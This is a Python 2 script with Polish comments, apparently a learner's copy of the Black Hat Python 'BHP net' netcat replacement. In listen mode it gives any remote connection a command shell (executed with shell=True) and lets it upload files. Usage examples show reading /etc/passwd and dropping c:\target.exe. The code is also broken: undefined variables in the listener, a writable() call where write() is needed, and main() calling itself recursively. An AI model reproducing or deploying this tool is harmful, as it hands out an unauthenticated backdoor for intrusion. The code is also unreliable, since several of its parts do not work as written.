import sys
import socket
import getopt
import threading
import subprocess

#definicje kilku zmiennych globalnych
listen  = False
command = False
upload  = False
execute = ""
target  = ""
upload_destination = ""
port    = 0

def usage ():
    print "narzedzie BHP net"
    print
    print "sposob uzycia: bhpnet.py -t target_host -p port"
    print "-l --listen      - nasluchuje na [host]:[port] polaczen przychodzacych"
    print "-e --execute=file_to_run     -wykonuje dany plik, gdy odbierze polaczenie"
    print "-c --command                 -inicjuje wiersz polecen"
    print "-u --upload=destination      - gdy odbierze polaczenie , wysyla plik i zapisuje go w [destination]"
    print
    print
    print "przyklady: "
    print "bhpnet.py -t 192168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)


#wysylanie polecen do clienta ( opcja przesylania danych)
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        #polaczenie sie z docelowym hostem
        client.connect((target,port))

        if  len(buffer):
            client.send(buffer)
        while True:
            #czekanie na zwrot danych
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response+= data

                if recv_len < 4096:
                    break
            print response,

            #czekanie na wiecej danych; czekanie na komende do wpisania przez nas
            buffer = raw_input("")
            buffer += "\n"

            #wysylanie danych
            client.send(buffer)
    except:
        print "[*] wyjatek zamykanie"

        #zamkniecie polaczenia
        client.close()


#tworzy socket servera i tworzy watek dla kazdego nawiazanego polaczenia z clientem(opcja nasluch)
def server_loop():
    global target

    #jesli nie zdefiniowano celu, nasluchujemy na wszystkich interfejsach
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    print"[*] Nasluchiwanie na porcie %s:%d" % (bind_ip, bind_port)

    while True:
        client_socket, addr = server.accept()

        print "[*] przyjeto polaczenie od: %s:%d" % (addr[0], addr[1])
        #watek do obslugi naszego nowego klienta
        client_thread = threading.Thread(target=client_handler, args = (client_socket,))
        client_thread.start()


#odsyla wynik przeslanej przez nas komendy
def run_command(command):

    #odciecie znaku nowego wiersza
    command = command.rstrip()

    #wykonanie polecenia i odebranie wyniku
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell = True)
    except:
        output = "nie udalo sie wykonac polecenia"

    #wyslanie wyniku do klienta
    return output

# chyba ze to dziala tak ze ten program lezy na kompie clienta i sam sie laczy z serwerem, gdzie my wszystko odbieramy
#wysylanie plikow i wykonywanie polecen i nasza konsola
def client_handler(client_socket):
    global upload
    global execute
    global command

    #sprawdzenie czy cos jes wysylane
    if len(upload_destination):
        #wczytanie wszystkich bajtow i zapis ich w miejscu docelowym
        #do tej zmiennej beda ladowane dane od clienta
        file_buffer = ""

        #wczytanie danych do konca
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        #proba zapisania wczytanych bajtow
        try:
            file_descriptior = open(upload_destination, "wb")
            file_descriptior.writable(file_buffer)
            file_descriptior.close()

            #potwierdzenie zapisania pliku
            client_socket.send("zapisano plik w %s \r\n" %upload_destination)
        except:
            client_socket.send("nieudalo sie zapisac pliku w %s\r\n" %upload_destination)

    #sprawdzenie czy wykonano poleceniee
    if len(execute):
        #wykonanie polecenia
        output = run_command(execute)
        client_socket.send(output)

    #jesli zazadano wiersza polecen przechodzimy do innej petli
    #wiersz polecen
    if command:

        while True:
            #wyswietlenie prostego wiersza polecen
            client_socket.send("<BHP:#> ")

                #pobieramy tekst do napotkania znaku nowego wiersza
                #(nacisniecie klawisza enter
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            #odeslanie wyniku polecenia
            response = run_command(cmd_buffer)

            #odeslanie odpowiedzi
            client_socket.send(response)

#jak wjebac do do param o i a z 190 lini wartosc -l zeby wyswietlilo printa

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target


    if not len(sys.argv[1:]):
        usage()
    #odczyt opcji wiersza polecen
    try:
        opts, args = getopt.getopt(sys.argv[1:],
                                   "hle:t:p:cu:",
                                   ["help", "listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    #ustawia zmienne w zaleznosci od parametrow wpisanej komendy systemowej
    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in("-l","--listen"):
            listen = True
            print "lecimy tutaj test do wyjebania"
        elif o in ("-e","--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u","--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False, "Nieobslugiwana opcja"

    #bedziemy nasluchiwac czy tylko wysylac dane ze stdin?
    #sys.stdin zczytuje dane z NASZEGO wiersza polecen

    #wysylanie danych
    if not listen and len(target) and port > 0:

        #wczytuje bufor z wiersza polecen
        #to powoduje blokade, wiec wyslij CTRL-D, gdy nie wysylasz danych do stdin
        buffer = sys.stdin.read()

        #wysyla dane
        client_sender(buffer)

    #nasluch
    #bedziemy nasluchiwac i ewentualnie cos wysylac, wykonywac polecenia oraz wlaczac
    #powloke w zaleznosci od opcji wiersza polecen
    if listen:
        server_loop()

    main()






























